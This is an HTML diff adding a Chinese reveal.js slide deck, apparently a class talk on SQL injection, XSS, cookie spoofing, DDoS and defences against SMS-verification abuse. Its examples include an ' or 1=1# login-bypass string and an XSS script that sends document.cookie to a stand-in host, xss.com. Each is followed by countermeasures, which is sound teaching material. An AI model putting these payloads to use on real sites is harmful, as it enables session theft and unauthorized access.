@@ -1,0 +1,260 @@
+
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>葡萄藤PPT</title>
+
+    <link rel="stylesheet" href="./css/reveal/reveal.css">
+
+    <!-- PPT主题，可以在/css/reveal/theme/中选择其他主题，目前暂时只能使用该模板 -->
+    <link rel="stylesheet" href="./css/reveal/theme/ptt.css">
+
+    <!-- syntax highlighting 代码高亮主题 -->
+    <link rel="stylesheet" href="./lib/reveal/css/zenburn.css">
+
+    <!-- 打印和PDF输出样式 -->
+    <script>
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = window.location.search.match( /print-pdf/gi ) ? './css/reveal/print/pdf.css' : '../css/reveal/print/paper.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+</head>
+<body>
+<img src="./img/demo/logo.png" alt="" usemap="#pttmap" class="base-logo">
+<map name="pttmap">
+    <area shape="rect" coords="0,0,276,58" href="http://www.jnshu.com" alt="" target="_blank"/>
+</map>
+<div class="reveal">
+    <div class="slides">
+        <section>
+            <h3>常见网络攻击方式介绍及短信防攻击策略的后端实现</h3>
+			<p>小课堂</p>
+            <h3></h3>
+            <p>分享人：王琦超</p>
+        </section>
+
+        <section>
+            <p>1.背景介绍</p>
+            <p>2.知识剖析</p>
+            <p>3.常见问题</p>
+            <p>4.解决方案</p>
+            <p>5.编码实战</p>
+            <p>6.扩展思考</p>
+            <p>7.参考文献</p>
+            <p>8.更多讨论</p>
+        </section>
+
+        <section>
+            <h3>1.背景介绍</h3>
+        </section>
+
+         <section>
+            <p style="text-align:left">有人的地方就有江湖，有数据交互的地方，就存在入侵风险。只有知己知彼，才能百战不殆。</p>
+　　        <p style="text-align:left">攻击的种类多种多样：SQL注入，旁注，XSS跨站，COOKIE欺骗，DDOS，0day 漏洞，社会工程学 等等等等</p>
+            <p style="text-align:left"></p>
+
+        </section>
+		
+
+
+        <section>
+            <h3>2.知识剖析</h3>
+        </section>
+
+        <section>
+            <p style="text-align:left">1.SQL注入攻击</p>
+            <p style="text-align:left">原理：构造特殊字符串，利用SQL语言的漏洞，对原先的SQL逻辑进行修改。</p>
+            <p style="text-align:left">解释：为什么会存在sql注入呢，只能说SQL出身不好。因为sql作为一种解释型语言，在运行时是由一个运行时组件解释语言代码并执行其中包含的指令的语言。基于这种执行方式，产生了一系列叫做代码注入（code injection）的漏洞 。它的数据其实是由程序员编写的代码和用户提交的数据共同组成的。程序员在web开发时，没有过滤敏感字符，绑定变量，导致攻击者可以通过sql灵活多变的语法，构造精心巧妙的语句，不择手段，达成目的，或者通过系统报错，返回对自己有用的信息。</p>
+            <p style="text-align:left"></p>
+            <p style="text-align:left"></p>
+        </section>
+
+        <section>
+            <p style="text-align:left">举例：系统数据库使用的seatement语句来处理传入的数据，输入管理员账户和密码之后，将密码加密然后放入执行语句执行</p>
+            <p style="text-align:left">select * from users where username='tarena' and password=md5('admin')</p>
+            <p style="text-align:left">当存在SQL漏洞的时候，通过构造特殊字符串，在用户名输入框中输入:’or 1=1#,密码随便输入，这时执行语句是这样的</p>
+            <p style="text-align:left">select * from users where username='' or 1=1#' and password=md5('')</p>
+            <p style="text-align:left">这时也可以登陆，因为上面这句话等价于</p>
+			<p style="text-align:left">select * from users where username='' or 1=1</p>
+           
+        </section>
+
+        <section>
+		 <p style="text-align:left">等价于</p>
+		 <p style="text-align:left">select * from users</p>
+            <p style="text-align:left">然后系统判断返回值不为空，就可以登陆了</p>
+            <p style="text-align:left">应对措施：1）使用preparestatement预编译SQL语句，使用占位符来代替传入参数，这样语句结构不会发生变化</p>
+            <p style="text-align:left">2）存储过程。存储过程（Stored Procedure）是一组完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过调用存储过程并给定参数（如果该存储过程带有参数）就可以执行它，也可以避免SQL注入攻击</p>
+            <p style="text-align:left">3）前端预处理语句，过滤非法字符比如;#等</p>
+        </section>
+		<section>
+            <p style="text-align:left">2.XSS跨站脚本攻击</p>
+            <p style="text-align:left">xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的。</p>
+            <p style="text-align:left">而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制，CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。</p>
+            <p style="text-align:left">其实XSS攻击就是网站输入框没有限制非法字符，或者没有对脚本内容进行编码导致的！</p>
+        </section>
+		<section>
+            <p style="text-align:left">举例：</p>
+            <p style="text-align:left">var img = document.createElement('img');</p>
+            <p style="text-align:left">img.src='http://www.xss.com?cookie='+document.cookie;</p>
+            <p style="text-align:left">img.style.display='none';</p>
+			<p style="text-align:left">document.getElementsByTagName('body')[0].appendChild(img);</p>
+			<p style="text-align:left">比如这段代码，当我们没有对网站输入框进行非法字符的限制的话，用户输入了这段脚本，这样就会神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。</p>
+        </section>
+		<section>
+            <p style="text-align:left">3.Cookie欺骗</p>
+            <p style="text-align:left">上面的cookie拿来有什么用呢？我们知道，HTTP是无状态的，需要依靠cookie,session来进行登陆状态的验证</p>
+            <p style="text-align:left">当我们获得别人的cookie之后，就可以通过在浏览器添加cookie的方法（有具体插件可以完成），实现登陆别人的账户来进行操作</p>
+            <p style="text-align:left">当然这只是cookie欺骗的一种方法，属于修改浏览器，而还有跳过浏览器，直接对通讯数据改写；使用签名脚本，让浏览器可以从本地读写任意域名cookie；欺骗浏览器，让浏览器获得假的域名。</p>
+        </section>
+		<section>
+            <p style="text-align:left">应对措施：</p>
+            <p style="text-align:left">1）开发者方面：少用cookie，一定要用的话，对其进行加密，绑定ip,动态请求一次一换，这样可以减少cookie被盗取后的损失</p>
+            <p style="text-align:left">2）使用者方面：尽量不在公用电脑输入用户名密码，使用完及时关闭浏览器，清除缓存</p>
+            <p style="text-align:left"></p>
+        </section>
+		 <section>
+            <p style="text-align:left">4.DDoS</p>
+            <p style="text-align:left">ddos的全称是分布式拒绝服务攻击，既然是拒绝服务一定是因为某些原因而停止服务的，其中最重要的也是最常用的原因就是利用服务端方面资源的有限性，这种服务端的资源范围很广，可以简单的梳理一个请求正常完成的过程：</p>
+            <p style="text-align:left">1）用户在客户端浏览器输入请求的地址</p>
+            <p style="text-align:left">2）浏览器解析该请求，包括分析其中的dns以明确需要到达的远程服务器地址</p>
+			<p style="text-align:left">3）明确地址后浏览器和服务器的服务尝试建立连接，尝试建立连接的数据包通过本地网络，中间路由最终艰苦到达目标网络再到达目标服务器</p>
+           
+        </section>
+		 <section>
+            <p style="text-align:left">4）网络连接建立完成之后浏览器根据请求建立不同的数据包并且将数据包发送到服务器某个端口</p>
+            <p style="text-align:left">5）端口映射到进程，进程接受到数据包之后进行内部的解析</p>
+            <p style="text-align:left">6）请求服务器内部的各种不同的资源，包括后端的API以及一些数据库或者文件等</p>
+            <p style="text-align:left">7）在逻辑处理完成之后数据包按照之前建立的通道返回到用户浏览器，浏览器完成解析，请求完成。</p>
+        </section>
+		 <section>
+            <p style="text-align:left">上面各个点都可以被用来进行ddos攻击，包括：</p>
+            <p style="text-align:left">1）某些著名的客户端劫持病毒</p>
+            <p style="text-align:left">2）进行dns劫持，或者直接大量的dns请求直接攻击dns服务器，这里可以使用一些专业的第三方dns服务来缓解这个问题，如Dnspod</p>
+            <p style="text-align:left">3）利用建立网络连接需要的网络资源攻击服务器带宽使得正常数据包无法到达</p>
+			<p style="text-align:left">4）利用webserver的一些特点进行攻击，相比nginx来说，apache处理一个请求的过程就比较笨重。</p>
+            <p style="text-align:left">5）利用应用程序内部的一些特性攻击程序内部的资源如mysql，后端消耗资源大的接口等等，这也就是传统意义上的CC攻击。</p>
+            <p style="text-align:left"></p>
+        </section>
+		 <section>
+            <p style="text-align:left">了解自己系统的短处，不要以己之短攻敌之长，譬如在路由器等设备上解决应用层攻击就不是一个好的办法，同理，在应用层尝试解决网络层的问题也是不可能的。</p>
+            <p style="text-align:left">我们防护的目标是只让正常的数据和请求进入到我们的服务，一个完善的防御体系应该考虑如下几个层面：</p>
+            <p style="text-align:left">1）作为用户请求的入口，必须有良好的dns防御</p>
+            <p style="text-align:left">2）与你的价值相匹配的带宽资源，并且在核心节点上布置好应用层的防御策略，只允许你的正常应用的网络数据包能够进入，譬如封杀除了80以外的所有数据包</p>
+            <p style="text-align:left">3）有支持你的服务价值的机器集群来抵抗应用层的压力，有必要的话需要将一个http请求继续分解，将连接建立的过程压力分解到其他的集群里</p>
+		</section>
+
+        <section>
+            <h3>3.常见问题</h3>
+        </section>
+
+        <section>
+            <p style="text-align:left">讲了那么多，离我们都好远，讲点近的吧</p>
+            <p style="text-align:left">怎么在我们的短信通道做好后端的防攻击策略？</p>
+			 <p style="text-align:left">攻击方式：通过脚本伪造用户网站上的短信请求接口，实现调用接口刷短信</p>
+            <p style="text-align:left">攻击目的：</p>
+            <p style="text-align:left">1.以攻击手机号为目的刷短信验证码</p>
+			<p style="text-align:left">2.以恶意刷取目标网站短信费用为目的的攻击</p>
+        </section>
+
+      
+
+        <section>
+            <h3>4.解决方案</h3>
+        </section>
+		  <section>
+            <p style="text-align:left">1.前端增加图文验证码，在输入正确的前提下才发送验证码</p>
+            <p style="text-align:left">2.限制单个手机号每日接收短信次数和时间间隔</p>
+            <p style="text-align:left">3.对IP进行限制</p>
+            <p style="text-align:left">4.对注册流程进行限定</p>
+            <p style="text-align:left">5.对发送者进行唯一性识别</p>
+        </section>
+		  <section>
+            <p style="text-align:left">但是在实际运行中，需要几种结合起来使用才行</p>
+            <p style="text-align:left">普通验证码的形式可以通过OCR识别的形式瞬间转化成文本形式，稍复杂的验证码也可以通过OCR+简单机器学习破解</p>
+            <p style="text-align:left">如果是针对单号码的短信轰炸，其在每个网站一般也就调用几次接口，通过多网站的形式实现轰炸，所以怎么辨别有效用户还是恶意调用就很困难，限制单个手机号次数也很困难杜绝</p>
+            <p style="text-align:left">禁用ip其实效果也不明显，因为现在切换ip成本很低</p>
+            <p style="text-align:left"></p>
+        </section>
+		
+
+      
+        <section>
+            <h3>5.编码实战</h3>
+        </section>
+
+        <section>
+            <h3>6.扩展思考</h3>
+        </section>
+
+      
+
+
+
+        <section>
+            <h3>7.参考文献</h3>
+        </section>
+
+        <section>
+            <p>https://www.cnblogs.com/daidai2016/p/7382549.html</p>
+            <p>https://blog.csdn.net/yizhenn/article/details/52384601</p>
+            <p>https://www.cnblogs.com/pursuitofacm/p/6706961.html</p>
+			<p>http://www.woshipm.com/pd/580976.html</p>
+			<p></p>
+        </section>
+
+        <section>
+            <h3>8.更多讨论</h3>
+        </section>
+
+        <section>
+            <h4>Thanks</h4>
+            <p></p>
+            <p><small>By : 上海分院 王琦超</small></p>
+        </section>
+
+    </div>
+</div>
+
+<script src="https://ptteng.github.io/PPT/lib/reveal/js/head.min.js"></script>
+<script src="https://ptteng.github.io/PPT/lib/reveal/reveal.js"></script>
+
+<script>
+
+    // 以下为常见配置属性的默认值
+    // {
+    // 	controls: true, // 是否在右下角展示控制条
+    // 	progress: true, // 是否显示演示的进度条
+    // 	slideNumber: false, // 是否显示当前幻灯片的页数编号，也可以使用代码slideNumber: 'c / t' ，表示当前页/总页数。
+    // 	history: false, // 是否将每个幻灯片改变加入到浏览器的历史记录中去
+    // 	keyboard: true, // 是否启用键盘快捷键来导航
+    // 	overview: true, // 是否启用幻灯片的概览模式，可使用"Esc"或"o"键来切换概览模式
+    // 	center: true, // 是否将幻灯片垂直居中
+    // 	touch: true, // 是否在触屏设备上启用触摸滑动切换
+    // 	loop: false, // 是否循环演示
+    // 	rtl: false, // 是否将演示的方向变成RTL，即从右往左
+    // 	fragments: true, // 全局开启和关闭碎片。
+    // 	autoSlide: 0, // 两个幻灯片之间自动切换的时间间隔（毫秒），当设置成 0 的时候则禁止自动切换，该值可以被幻灯片上的 ` data-autoslide` 属性覆盖
+    // 	transition: 'default', // 切换过渡效果，有none/fade/slide/convex/concave/zoom
+    // 	transitionSpeed: 'default', // 过渡速度，default/fast/slow
+    // 	mouseWheel: true, //是否启用通过鼠标滚轮来切换幻灯片
+    // }
+
+    // 初始化幻灯片
+    Reveal.initialize({
+        history: true,
+        dependencies: [
+            { src: 'https://ptteng.github.io/PPT/plugin/markdown/marked.js' },
+            { src: 'https://ptteng.github.io/PPT/plugin/markdown/markdown.js' },
+            { src: 'https://ptteng.github.io/PPT/plugin/notes/notes.js', async: true },
+            { src: 'https://ptteng.github.io/PPT/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+        ]
+    });
+</script>
+</body>
+</html>
